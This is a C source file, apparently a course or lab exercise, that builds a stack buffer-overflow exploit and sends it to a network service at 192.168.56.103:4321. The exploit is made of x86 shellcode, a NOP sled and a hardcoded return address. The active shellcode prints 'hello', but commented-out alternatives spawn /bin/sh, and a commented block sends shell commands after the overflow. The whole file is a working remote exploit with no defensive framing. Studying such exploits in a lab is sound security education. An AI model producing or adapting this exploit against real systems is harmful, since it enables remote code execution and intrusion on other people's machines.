#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>

#include <string.h>


int main(int argc, char* argv[]) {
	
	// Shellcode to print hello
	unsigned char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";
	int shell_len = 37;
	
	// Shellcode to open a shell
//	unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
//	int shell_len = 28;
	
	// Another shellcode to open a shell
//	unsigned char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
//	int shell_len = 27;
	
	
	unsigned char ret[] = "\xf0\xe5\xff\xff\xff\x7f";
//	unsigned char ret[] = "\x7f\xff\xff\xff\xe5\xf0";
	
	unsigned char msg[256];
	memset(msg, 0, 256);
	
	
	// The total length of msg
	int n = atoi(argv[1]);
	int NOP_len = n - shell_len - 6;
	
	// The payload
	for (int k = 0; k < shell_len; k++) {
		msg[k] = shellcode[k];
	}
		
	// The NOP-slide
	for (int k = shell_len; k < shell_len + NOP_len; k++) {
		msg[k] = '\x90';
	}
	
	// The return address
	for (int k = 0; k < 6; k++) {
		msg[k + shell_len + NOP_len] = ret[k];
	}
	
	// Adding the \n so fgets returns
	msg[shell_len + NOP_len + 6] = '\n';
	
	
	
	printf("msg: %s\n", msg);
	/*
	for (int k = 0; k < shell_len + NOP_len + 10; k++) {
		printf("%d: %x\n", k, msg[k]);
	}
	*/
	
	
	
	// Building destination addr_in
	struct sockaddr_in dest;
	dest.sin_family = AF_INET;
	dest.sin_port = htons(4321);
	if (inet_pton(AF_INET, "192.168.56.103", &(dest.sin_addr)) != 1) printf("inet_pton error\n\n");
	for (int k = 0; k < 8; k++) dest.sin_zero[k] = 0;

	// Building the socket
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("Error building socket");
  		exit(1);
  	}
	
	// Connecting
	if (connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in)) != 0) {
		printf("Failed to connect");
  		exit(1);
	} else {
		printf("\nConnected successfully\n\n");
	}

	
	// Message 1
	int buf_len = 2000;
	char recvbuf[buf_len];
	memset(recvbuf, 0, buf_len);
	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
		printf("Error receiving message");
  		exit(1);
	}
	printf("Message 1: %s\n", recvbuf);
	
	
	// Sending name
	if (send(sockfd, msg, n + 1, 0) != n + 1) {
		printf("Failed to send message entirely");
  		exit(1);
	} else {
		printf("Attack sent\n\n");
	}
	
	
	/*
	// Sending command to be executed
	char command[] = "ls";
	if (send(sockfd, command, strlen(command), 0) != strlen(command)) {
		printf("Failed to send message entirely");
  		exit(1);
	} else {
		printf("Command sent\n\n");
	}
	*/
	
	
	// Reply
	memset(recvbuf, 0, buf_len);
	int recv_status = recv(sockfd, recvbuf, buf_len, 0);
	if (recv_status == -1) {
		printf("Error receiving message: %d\n\n", errno);
  		exit(1);
	} else if (recv_status == 0) {
		printf("Connection terminated\n");
	}
	
	printf("%s\n", recvbuf);
	
	return 0;
	
}
